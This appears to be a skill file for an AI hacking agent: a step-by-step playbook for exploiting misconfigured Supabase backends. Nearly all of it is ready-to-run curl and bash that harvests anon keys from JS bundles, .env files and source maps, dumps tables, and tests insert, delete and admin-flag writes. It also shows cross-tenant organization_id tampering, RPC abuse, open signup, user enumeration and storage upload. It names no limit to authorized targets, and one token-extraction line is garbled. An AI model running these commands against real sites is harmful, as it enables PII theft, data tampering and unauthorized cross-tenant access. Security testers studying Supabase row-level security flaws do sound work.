---
name: hunt-supabase
description: "Hunt Supabase exploitation — Supabase anon key discovery in JS bundles, REST API table enumeration with anon key, Row Level Security (RLS) bypass via missing organization_id check, RPC function abuse returning cross-organization data, Storage bucket listing, Auth signUp/signIn with anon key, multi-tenant enumeration via WHOIS, bucket file upload/download without auth. Built from field observation of Lovable.dev + Supabase stack on rapidly-built platforms where RLS policies are consistently misconfigured. Use when a JS bundle, .env, or APK reveals a Supabase URL (project.supabase.co) and anon key (eyJ...)."
sources: field_recon, offensive_research
report_count: 8
---

# HUNT-SUPABASE — Supabase Exploitation

## Crown Jewel Targets

Supabase is the open-source Firebase alternative. It uses **Row Level Security (RLS)** for access control, but RLS policies are frequently misconfigured — especially in rapid-development stacks (Lovable.dev, Bolt.new, Cursor).

**Highest-value findings:**
1. **Public tables via anon key** — REST API with anon key returns table data when RLS is disabled or policies are permissive. Critical.
2. **RLS bypass via organization_id** — UPDATE operation checks user ownership but NOT organization_id -> cross-tenant data access. Critical.
3. **RPC functions returning global data** — SECURITY DEFINER RPC functions that don't filter by auth.uid() -> all users' data. High.
4. **Storage buckets without RLS** — Public file listing, upload, and download. High.
5. **Open signUp** — Anyone can register and get a JWT. High.
6. **Multi-tenant enumeration** — Same broken-RLS patterns across multiple apps built by the same developer. Medium.

---

## Phase 1 — Find the Supabase Project

Supabase is identified by its URL format: `https://[PROJECT_REF].supabase.co` and anon key format: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...` (JWT starting with `eyJ`)

### 1.1 Search in JS Bundles
```bash
# Download JS bundles and search for Supabase
curl -sk "https://$TARGET" | grep -oP 'src="[^"]*\.js"' | cut -d'"' -f2 | while read js; do
  curl -sk "https://$TARGET$js" -o "/tmp/$(basename $js)"
done

# Search for Supabase URL pattern
grep -rPn 'https://[a-z0-9-]+\.supabase\.co' /tmp/*.js
grep -rPn 'supabaseUrl|SUPABASE_URL|supabaseKey|SUPABASE_ANON_KEY' /tmp/*.js

# Search for Supabase JWT anon key
grep -rPn 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.\S+' /tmp/*.js

# Quick one-liner
curl -sk "https://$TARGET" | grep -oP 'https://[a-z0-9-]+\.supabase\.co'
curl -sk "https://$TARGET" | grep -oP '(?:supabaseUrl|SUPABASE_URL)[": ]+[^"'\''\s]+'
```

### 1.2 Search in .env and Config Files
```bash
curl -sk "https://$TARGET/.env" | grep -i "SUPABASE"
curl -sk "https://$TARGET/.env.production" | grep -i "SUPABASE"
curl -sk "https://$TARGET/config.js" | grep -i "supabase"

# JSON config files
curl -sk "https://$TARGET/manifest.json" | python3 -c "import sys, json; d = json.load(sys.stdin); print(d)" 2>/dev/null
```

### 1.3 Extract from Source Maps
```bash
# Check source maps for Supabase config
curl -sk "https://$TARGET" | grep -oP 'sourceMappingURL=[^\s"]+' | cut -d= -f2 | while read sm; do
  curl -sk "https://$TARGET$(echo $sm | sed 's|^/||')" -o "/tmp/$(basename $sm)"
done

cat /tmp/*.map 2>/dev/null | python3 -c "
import sys, json, re
try:
    data = json.load(sys.stdin)
    sources = data.get('sourcesContent', [])
    for src in sources:
        if not src: continue
        urls = re.findall(r'https://[a-z0-9-]+\.supabase\.co', src)
        keys = re.findall(r'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.\S{50,}', src)
        for u in urls: print(f'URL: {u}')
        for k in keys: print(f'ANON_KEY: {k}')
except: pass
" 2>/dev/null
```

---

## Phase 2 — Supabase Reconnaissance

Once you have the Supabase URL and anon key:

```bash
SUPABASE_URL="https://xxxxxxx.supabase.co"
ANON_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Step 1: Verify the project exists
curl -sk "$SUPABASE_URL/rest/v1/" -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"

# Step 2: OpenAPI/Swagger spec (sometimes exposed)
curl -sk "$SUPABASE_URL/rest/v1/?apikey=$ANON_KEY"

# Step 3: Try to list all tables (requires RLS listing to be enabled)
curl -sk "$SUPABASE_URL/rest/v1/?" -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"

# Step 4: Common table names to try
for table in users profiles user_profiles customers orders products messages posts comments settings config api_keys tokens sessions accounts transactions documents files uploads; do
  response=$(curl -sk -o /dev/null -w "%{http_code}" "$SUPABASE_URL/rest/v1/$table?limit=1" \
    -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY")
  if [ "$response" = "200" ]; then
    echo "[+] PUBLIC TABLE: $table"
    # Sample the data
    curl -sk "$SUPABASE_URL/rest/v1/$table?limit=2" \
      -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" | python3 -m json.tool | head -20
  fi
done
```

---

## Phase 3 — Data Enumeration with Anon Key

### 3.1 Read Table Data
```bash
# Read all data from a table (Supabase REST API uses pagination)
TABLE="users"
curl -sk "$SUPABASE_URL/rest/v1/$TABLE?select=*" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"

# Paginate through all rows (1000 per page default)
curl -sk "$SUPABASE_URL/rest/v1/$TABLE?select=*&limit=1000&offset=0" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"

# Select specific columns
curl -sk "$SUPABASE_URL/rest/v1/$TABLE?select=id,email,username,role" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"

# Filter rows
curl -sk "$SUPABASE_URL/rest/v1/$TABLE?role=eq.admin&select=id,email" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"

# Count total rows
curl -sk -I "$SUPABASE_URL/rest/v1/$TABLE?select=*" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" | grep -i "content-range"
```

### 3.2 Try Write Access
```bash
# Try inserting (CRITICAL if works)
curl -sk -X POST "$SUPABASE_URL/rest/v1/$TABLE" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ANON_KEY" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=minimal" \
  -d '{"test_column": "pwned"}'

# Try update
curl -sk -X PATCH "$SUPABASE_URL/rest/v1/$TABLE?id=eq.1" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{"admin": true}'

# Try delete
curl -sk -X DELETE "$SUPABASE_URL/rest/v1/$TABLE?id=eq.1" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ANON_KEY"
```

---

## Phase 4 — RLS Bypass via Organization ID Manipulation

This is the most common Supabase vulnerability in multi-tenant apps.

### 4.1 Cross-Organization IDOR via UPDATE
```bash
# If RLS allows UPDATE on your own profile but doesn't check organization_id:
# Step 1: Get your user profile
curl -sk "$SUPABASE_URL/rest/v1/profiles?id=eq.{MY_ID}" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $USER_JWT"

# Step 2: Try to change your organization_id to the target org
curl -sk -X PATCH "$SUPABASE_URL/rest/v1/profiles?id=eq.{MY_ID}" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $USER_JWT" \
  -H "Content-Type: application/json" \
  -d '{"organization_id":"TARGET_ORG_UUID"}'

# Step 3: If 200 -> Now you see the target org's data!
curl -sk "$SUPABASE_URL/rest/v1/projects?organization_id=eq.TARGET_ORG_UUID" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $USER_JWT"
```

### 4.2 RPC Function without Organization Filter
```bash
# RPC functions often return GLOBAL data without checking org membership
# Step 1: List available RPC functions
curl -sk "$SUPABASE_URL/rest/v1/rpc/" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $USER_JWT"

# Step 2: Try common RPC names
for rpc in get_stats get_dashboard get_analytics get_metrics get_summary get_report; do
  response=$(curl -sk "$SUPABASE_URL/rest/v1/rpc/$rpc" \
    -H "apikey: $ANON_KEY" -H "Authorization: Bearer $USER_JWT" \
    -H "Content-Type: application/json" -d '{}')
  if echo "$response" | python3 -c "import sys, json; json.load(sys.stdin); print('OK')" 2>/dev/null; then
    echo "[+] RPC accessible: $rpc"
    echo "$response" | python3 -m json.tool | head -20
  fi
done
```

### 4.3 Multi-Tenant Enumeration via WHOIS
```bash
# If the same developer/agency built multiple apps, they share the same RLS flaws.
# Step 1: Get the target domain's WHOIS to find the owner/dev
whois $TARGET | grep -iE "email|org|name|admin"

# Step 2: Search crt.sh for other domains owned by the same org
curl -sk "https://crt.sh/?q=%25.$TARGET&output=json" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    domains = set(d['name_value'] for d in data)
    print('\n'.join(sorted(domains)))
except: pass
"

# Step 3: Test each for Supabase with the same broken RLS patterns
```

---

## Phase 5 — Supabase Auth Exploitation

### 5.1 Open SignUp
```bash
# Check if email/password signup is enabled
curl -sk -X POST "$SUPABASE_URL/auth/v1/signup" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@test.com",
    "password": "TestPassword123!"
  }'
# HTTP 200 with access_token + user = OPEN SIGNUP!
```

### 5.2 Extract JWT from SignUp
```bash
# If signup succeeds, extract the JWT and use it for authenticated requests
SIGNUP=$(curl -sk -X POST "$SUPABASE_URL/auth/v1/signup" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"TestPassword123!"}')

ACCESS_TOKEN=*** "$SIGNUP" | python3 -c "import sys, json; print(json.load(sys.stdin).get('access_token', 'NONE'))")

# Use this JWT for authenticated API calls
curl -sk "$SUPABASE_URL/rest/v1/users?select=*" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ACCESS_TOKEN"
```

### 5.3 Brute User Enumeration
```bash
# Supabase returns different errors for existing vs non-existing users
for email in admin@$TARGET user@$TARGET info@$TARGET support@$TARGET; do
  response=$(curl -sk -w "%{http_code}" -o /dev/null "$SUPABASE_URL/auth/v1/signup" \
    -H "apikey: $ANON_KEY" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"password\":\"Test123!\"}")
  # HTTP 200 = new user created
  # HTTP 422 = email already exists -> VALID USER
  # HTTP 400 = validation error
  echo "$email: $response"
done
```

---

## Phase 6 — Supabase Storage Exploitation

```bash
# Step 1: List storage buckets (if RLS allows)
curl -sk "$SUPABASE_URL/storage/v1/bucket" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"

# Step 2: If buckets found, list files
BUCKET="files"
curl -sk "$SUPABASE_URL/storage/v1/object/list/$BUCKET" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"

# Step 3: Download a file
curl -sk "$SUPABASE_URL/storage/v1/object/public/$BUCKET/filename.pdf" \
  -o /tmp/downloaded_file

# Step 4: Upload a file (test write)
curl -sk -X POST "$SUPABASE_URL/storage/v1/object/$BUCKET/test.txt" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ANON_KEY" \
  -H "Content-Type: text/plain" \
  -d "pwned"
# HTTP 200 with Key -> upload allowed!

# Step 5: Get public URL for uploaded file
curl -sk "$SUPABASE_URL/storage/v1/object/public/$BUCKET/test.txt" \
  -H "apikey: $ANON_KEY"
```

---

## Phase 7 — Attack Chains

### Chain A: Anon Key in JS -> Public Table Dump
```
JS bundle contains supabaseUrl + anon key ->
Try common table names (profiles, users, orders) ->
RLS disabled -> Dump ALL data ->
PII breach (emails, names, addresses)
```

### Chain B: Open SignUp -> Authenticated Access -> Write
```
Supabase signup endpoint accepts new users ->
Create account -> Get JWT ->
Use JWT for authenticated REST API calls ->
Access tables that require auth but have no ownership checks
```

### Chain C: RLS Bypass via Org ID -> Cross-Tenant
```
UPDATE profiles where id=my_id set organization_id to target_org ->
RLS checks auth.uid() matches id but NOT organization_id ->
Switch org context -> See target org's data ->
Indirect cross-tenant attack
```

### Chain D: RPC Function -> Global Data Access
```
RPC function defined as SECURITY DEFINER with no filter ->
Any authenticated user calls get_stats() ->
Returns aggregated data from ALL tenants ->
Data leakage
```

---

## Validation Severity

| Finding | Severity |
|---------|----------|
| Anon key grants SELECT on PII tables | Critical |
| Anon key grants INSERT/UPDATE/DELETE | Critical |
| Open signup (anyone creates accounts) | High |
| RPC returns cross-org data | High |
| Storage bucket public list/download | High |
| Storage bucket public upload | Critical |
| Email enumeration via signup | Low-Medium |
| RLS bypass via org_id tampering | Critical |
| RLS policy missing on table | High |
| Supabase project ID only (no key) | Informational |

---

## Related Skills

- hunt-firebase — Firebase/Firestore/GCP sibling exploitation (similar anon-key pattern)
- hunt-source-leak — API key discovery in JS bundles, .env, source maps
- hunt-idor — RLS-bypass via organization_id is an IDOR variant
- hunt-api-misconfig — REST API endpoint enumeration methodology
- hunt-cors — CORS on Supabase REST API endpoints

## Common Supabase Finding Formats

```bash
# Quick test: does the target use Supabase?
curl -sk "https://$TARGET" | grep -oP 'https://[a-z0-9-]+\.supabase\.co'
curl -sk "https://$TARGET" | grep -oP 'anon[": ]+["]*eyJ'

# Check Google dorks for Supabase
# site:target.com "supabase.co"
# site:target.com "supabaseUrl"
# site:target.com "SUPABASE_ANON_KEY"
```
